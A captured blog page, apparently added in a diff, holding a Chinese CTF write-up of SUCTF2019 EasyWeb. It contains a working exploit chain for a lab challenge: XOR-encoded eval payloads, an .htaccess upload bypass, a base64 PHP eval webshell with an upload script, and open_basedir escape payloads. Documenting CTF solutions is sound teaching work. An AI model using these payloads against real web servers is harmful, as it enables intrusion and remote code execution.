@@ -1,0 +1,247 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SUCTF2019-EasyWeb | 0xL0r1cP03m's blog</title><meta name="keywords" content="ctf,web,php代码审计"><meta name="author" content="0xL0r1cP03m"><meta name="copyright" content="0xL0r1cP03m"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.源码1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction get_the_flag()&amp;#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF2019-EasyWeb">
+<meta property="og:url" content="https://m4xlmum.github.io/2020/10/26/SUCTF2019-EasyWeb/index.html">
+<meta property="og:site_name" content="0xL0r1cP03m&#39;s blog">
+<meta property="og:description" content="1.源码1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction get_the_flag()&amp;#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;t">
+<meta property="og:locale">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2022/05/17/2c953acc65a1d5da.png">
+<meta property="article:published_time" content="2020-10-26T13:46:36.000Z">
+<meta property="article:modified_time" content="2022-08-29T03:36:52.040Z">
+<meta property="article:author" content="0xL0r1cP03m">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2022/05/17/2c953acc65a1d5da.png"><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://m4xlmum.github.io/2020/10/26/SUCTF2019-EasyWeb/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SUCTF2019-EasyWeb',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-08-29 11:36:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/logo.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">130</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">101</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s3.bmp.ovh/imgs/2022/05/17/2c953acc65a1d5da.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">0xL0r1cP03m's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SUCTF2019-EasyWeb</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-10-26T13:46:36.000Z" title="Created 2020-10-26 21:46:36">2020-10-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-08-29T03:36:52.040Z" title="Updated 2022-08-29 11:36:52">2022-08-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>5min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SUCTF2019-EasyWeb"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&#x27;_&#x27;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&#x27;One inch long, one inch strong!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh) )</span><br><span class="line">    die(&#x27;Try something else!&#x27;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先看下面的代码执行RCE。<code>eval($hhh);</code>。</p>
+<h2 id="2-php不可见字符绕过preg-match-函数rce"><a href="#2-php不可见字符绕过preg-match-函数rce" class="headerlink" title="2.php不可见字符绕过preg_match()函数rce"></a>2.php不可见字符绕过preg_match()函数rce</h2><p>首先有<code>eval()</code>函数，就先想着绕过前面的各种限制（就是字符串的长度小于或等于18个），这个看大佬的wp说可以用什么不可见字符异或得我们想要的字符来绕过，下面是大佬的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;T&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = <span class="built_in">chr</span>(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s:%s^%s&quot;</span>%(result,a,b))</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/10/26/SUCTF2019-EasyWeb//1.png"></p>
+<p>可见</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_:%FF^%A0</span><br><span class="line">G:%FF^%B8</span><br><span class="line">E:%FF^%BA</span><br><span class="line">T:%FF^%AB</span><br></pre></td></tr></table></figure>
+
+<p>可用的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"></span><br><span class="line">她所代表的真正的含义为</span><br><span class="line">`$_GET&#123;x&#125;()`</span><br></pre></td></tr></table></figure>
+<p>后面就能通过上传参数<code>x=phpinfo</code>构造<code>phpinfo();</code>了。（ztmnb）<br><img src="/2020/10/26/SUCTF2019-EasyWeb//2.png"></p>
+<p>然后把<code>phpinfo</code>换为<code>get_the_flag()</code>函数就能执行这个上传的功能了。（好像是因为设置了什么open_basedir限制了eval的功能，所以得传个webshell才可）</p>
+<h2 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h2><p>上传部分源码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);   #对ph开头的后缀名做了限制</span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);  #对`&lt;?`做了限制</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-上传文件"><a href="#1-上传文件" class="headerlink" title="1.上传文件"></a>1.上传文件</h3><p>大佬的经验<code>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。</code><br>可以用以下两种方法开头以绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">可以用</span><br><span class="line">&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也可以用</span><br><span class="line">&quot;#define width 1337&quot;</span><br><span class="line">&quot;#define height 1337&quot;</span><br></pre></td></tr></table></figure>
+
+<p>另外<code>因为这里的php是7.2的版本，无法使用 &lt;script language=&quot;php&quot;&gt;&lt;/script&gt; 来绕过对 &lt;? 的检测</code></p>
+<p>这里的绕过对<code>&lt;?</code>的检测。可以使用<code>base64编码</code>进行绕过，然后再在apache的解析文件中将文件的内容还原从而绕过<br><img src="/2020/10/26/SUCTF2019-EasyWeb//3.png"></p>
+<p>.htaccess文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x8a\x39\x8a\x39</span><br><span class="line">AddType application/x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_556cf09f27d80bd5b6cffc1d3f08a264/sh3ll.abc&quot;</span><br></pre></td></tr></table></figure>
+<p>这里的<code>tmp_</code>后面的似乎是当前的ip地址md5加密后的结果，<del>浏览器输入ip，复制后加密取32位小写代换一下就ok啦。</del>好了这样不行，我好jb菜，得等下面的脚本运行成功后改为脚本打印出来的值就ok了。</p>
+<p>sh3ll.abc文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnMSddKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-上传文件的脚本"><a href="#2-上传文件的脚本" class="headerlink" title="2.上传文件的脚本"></a>2.上传文件的脚本</h3><p>借鉴一个上传文件的脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_556cf09f27d80bd5b6cffc1d3f08a264/sh3ll.abc&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sh3ll = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;1&#x27;]);?&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://142537bb-b873-4a5a-900c-80c61dd2b53d.node3.buuoj.cn/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;sh3ll.abc&#x27;</span>,sh3ll,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">          <span class="comment">#文件:(&#x27;上传的文件名&#x27;,变量名,&#x27;文件类型&#x27;)</span></span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+<p>文件上传成功<img src="/2020/10/26/SUCTF2019-EasyWeb//4.png"></p>
+<h2 id="4-绕过disable-function之open-basedir"><a href="#4-绕过disable-function之open-basedir" class="headerlink" title="4.绕过disable_function之open_basedir:"></a>4.绕过disable_function之<code>open_basedir:</code></h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">先知上绕过open_basedir限制的解析</a><br>所以这个可以用下面的payload（文章内容没细看）<br>在<code>hackbar</code>里面测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/26/SUCTF2019-EasyWeb//5.png"><br>flag文件名为<code>THis_Is_tHe_F14g</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/10/26/SUCTF2019-EasyWeb//6.png"></p>
+<h2 id="5-flag"><a href="#5-flag" class="headerlink" title="5.flag"></a>5.flag</h2><p><code>flag&#123;3f0c058d-ac5a-45a8-a1fd-8ab96b968630&#125;</code></p>
+<blockquote>
+<p>好TM累，睡觉！</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">0xL0r1cP03m</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://m4xlmum.github.io/2020/10/26/SUCTF2019-EasyWeb/">https://m4xlmum.github.io/2020/10/26/SUCTF2019-EasyWeb/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a></div><div class="post_share"><div class="social-share" data-image="https://s3.bmp.ovh/imgs/2022/05/17/2c953acc65a1d5da.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/"><img class="prev-cover" src="https://s3.bmp.ovh/imgs/2021/10/0081d595db2a4e9a.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">GKCTF2020-EZ三剑客-EzNode</div></div></a></div><div class="next-post pull-right"><a href="/2020/10/25/BUUOJ%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98-%E4%B8%80%E8%88%ACRSA/"><img class="next-cover" src="/images/BUUOJ%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98-%E4%B8%80%E8%88%ACRSA.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">BUUOJ_密码_RSA</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/10/24/BJDCTF2020-EzPHP/" title="BJDCTF2020-EzPHP"><img class="cover" src="/images/BJDCTF2020-EzPHP.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-24</div><div class="title">BJDCTF2020-EzPHP</div></div></a></div><div><a href="/2020/10/30/HFCTF2020-BabyUpload/" title="HFCTF2020-BabyUpload"><img class="cover" src="https://s3.bmp.ovh/imgs/2022/05/17/c5ba5fd6537dd731.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-30</div><div class="title">HFCTF2020-BabyUpload</div></div></a></div><div><a href="/2020/11/25/ADWord-web%E8%BF%9B%E9%98%B6/" title="ADWord_web进阶"><img class="cover" src="/images/default/img-4.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-25</div><div class="title">ADWord_web进阶</div></div></a></div><div><a href="/2020/11/03/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B/" title="BJDCTF-2nd-文件探测"><img class="cover" src="/images/BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-03</div><div class="title">BJDCTF-2nd-文件探测</div></div></a></div><div><a href="/2020/11/12/BSidesCF-2019/" title="BSidesCF-2019-web部分"><img class="cover" src="/images/BSidesCF-2019.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-12</div><div class="title">BSidesCF-2019-web部分</div></div></a></div><div><a 